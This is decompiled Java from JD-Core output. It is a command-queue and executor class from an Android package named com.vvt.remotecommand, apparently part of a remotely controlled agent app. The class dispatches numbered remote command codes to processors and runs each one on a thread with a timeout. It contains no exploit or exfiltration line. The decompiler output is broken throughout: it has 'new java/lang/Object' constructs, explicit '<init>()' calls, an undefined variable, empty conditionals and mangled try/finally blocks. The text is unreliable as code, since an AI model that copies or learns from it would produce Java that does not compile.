package com.vvt.remotecommand.a;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class b
{
  private static final boolean a;
  private static final boolean b;
  private final Object c;
  private ArrayList d;
  private com.vvt.remotecommand.processor.c e;
  private Thread f;
  private Thread g;
  private Timer h;
  private TimerTask i;
  
  static
  {
    boolean bool = com.vvt.ak.a.b;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.e;
      return;
    }
  }
  
  public b()
  {
    this(localArrayList);
  }
  
  b(ArrayList paramArrayList)
  {
    Object localObject = new java/lang/Object;
    localObject.<init>();
    this.c = localObject;
    this.d = paramArrayList;
  }
  
  private void a(RemoteCommand paramRemoteCommand, RemoteCommandProcessor paramRemoteCommandProcessor)
  {
    Object localObject = paramRemoteCommand.getCode();
    String str = "90";
    boolean bool = ((String)localObject).equalsIgnoreCase(str);
    if (!bool)
    {
      localObject = paramRemoteCommand.getCode();
      str = "120";
      bool = ((String)localObject).equalsIgnoreCase(str);
      if (!bool)
      {
        localObject = paramRemoteCommand.getCode();
        str = "213";
        bool = ((String)localObject).equalsIgnoreCase(str);
        if (!bool)
        {
          localObject = paramRemoteCommand.getCode();
          str = "307";
          bool = ((String)localObject).equalsIgnoreCase(str);
          if (!bool)
          {
            localObject = paramRemoteCommand.getCode();
            str = "14142";
            bool = ((String)localObject).equalsIgnoreCase(str);
            if (!bool) {
              break label134;
            }
          }
        }
      }
    }
    bool = a;
    if (bool) {}
    localObject = this.e;
    ((com.vvt.remotecommand.processor.c)localObject).a(paramRemoteCommand, paramRemoteCommandProcessor);
    for (;;)
    {
      return;
      label134:
      bool = a;
      if (!bool) {}
    }
  }
  
  private void a(Thread paramThread, long paramLong)
  {
    d();
    Object localObject = new com/vvt/remotecommand/a/e;
    ((e)localObject).<init>(this, paramThread);
    this.i = ((TimerTask)localObject);
    localObject = new java/util/Timer;
    ((Timer)localObject).<init>();
    this.h = ((Timer)localObject);
    localObject = this.h;
    TimerTask localTimerTask = this.i;
    ((Timer)localObject).schedule(localTimerTask, paramLong);
  }
  
  private void d()
  {
    Object localObject = this.i;
    if (localObject != null)
    {
      localObject = this.i;
      ((TimerTask)localObject).cancel();
      this.i = null;
    }
    localObject = this.h;
    if (localObject != null)
    {
      localObject = this.h;
      ((Timer)localObject).cancel();
      this.h = null;
    }
  }
  
  a a()
  {
    Object localObject1 = null;
    synchronized (this.d)
    {
      ArrayList localArrayList2 = this.d;
      boolean bool = localArrayList2.isEmpty();
      if (!bool)
      {
        localObject1 = this.d;
        bool = false;
        localArrayList2 = null;
        localObject1 = ((ArrayList)localObject1).get(0);
        localObject1 = (a)localObject1;
      }
      return (a)localObject1;
    }
  }
  
  public void a(a parama)
  {
    synchronized (this.d)
    {
      ArrayList localArrayList2 = this.d;
      localArrayList2.add(parama);
      return;
    }
  }
  
  public void a(com.vvt.remotecommand.processor.c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    this.e = paramc;
    Object localObject = this.f;
    if (localObject != null)
    {
      localObject = this.f;
      bool1 = ((Thread)localObject).isAlive();
      if (bool1) {
        bool1 = true;
      }
    }
    for (;;)
    {
      boolean bool2 = a;
      if ((!bool2) || (!bool1))
      {
        localObject = new com/vvt/remotecommand/a/c;
        ((c)localObject).<init>(this, "RCommandExecutorT");
        this.f = ((Thread)localObject);
        localObject = this.f;
        d locald = new com/vvt/remotecommand/a/d;
        locald.<init>(this);
        ((Thread)localObject).setUncaughtExceptionHandler(locald);
        localObject = this.f;
        ((Thread)localObject).start();
        bool1 = a;
        if (!bool1) {}
      }
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = false;
      localObject = null;
    }
  }
  
  void a(Object paramObject, com.vvt.remotecommand.processor.c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    localObject1 = null;
    for (;;)
    {
      try
      {
        localObject1 = a();
        if (localObject1 == null)
        {
          bool1 = a;
          if ((!bool1) || (localObject1 != null))
          {
            bool1 = a;
            if (bool1) {}
            b((a)localObject1);
          }
          bool1 = a;
          if (bool1) {}
          return;
        }
        RemoteCommand localRemoteCommand = ((a)localObject1).a();
        RemoteCommandProcessor localRemoteCommandProcessor = ((a)localObject1).b();
        bool1 = a;
        if (bool1) {}
        localObject2 = new com/vvt/remotecommand/a/f;
        b localb = this;
        ((f)localObject2).<init>(this, paramObject, localRemoteCommandProcessor, localRemoteCommand, paramc);
        this.g = ((Thread)localObject2);
        long l1 = localRemoteCommandProcessor.g();
        long l2 = 0L;
        bool1 = l1 < l2;
        if (bool1)
        {
          localObject2 = this.g;
          long l3 = localRemoteCommandProcessor.g();
          a((Thread)localObject2, l3);
          bool1 = a;
          if (!bool1) {}
        }
        a(localRemoteCommand, localRemoteCommandProcessor);
        bool1 = a;
        if (bool1) {}
        localObject2 = this.g;
        ((Thread)localObject2).start();
      }
      catch (Exception localException)
      {
        Object localObject2;
        localObject4 = localObject1;
      }
      finally
      {
        try
        {
          Object localObject4;
          bool2 = b;
          if ((bool2) && (localObject4 == null)) {
            continue;
          }
          bool2 = a;
          if (bool2) {}
          b((a)localObject4);
          continue;
        }
        finally
        {
          boolean bool2;
          localObject1 = localObject5;
          Object localObject6 = localObject7;
        }
        localObject5 = finally;
      }
      try
      {
        paramObject.wait();
        d();
        bool1 = a;
        if ((!bool1) || (localObject1 != null))
        {
          bool1 = a;
          if (bool1) {}
          b((a)localObject1);
        }
        localObject2 = localObject1;
        localObject1 = localObject2;
      }
      finally {}
    }
    if (localObject1 != null)
    {
      bool2 = a;
      if (bool2) {}
      b((a)localObject1);
    }
    throw ((Throwable)localObject5);
  }
  
  void b(a parama)
  {
    synchronized (this.d)
    {
      ArrayList localArrayList2 = this.d;
      localArrayList2.remove(parama);
      return;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */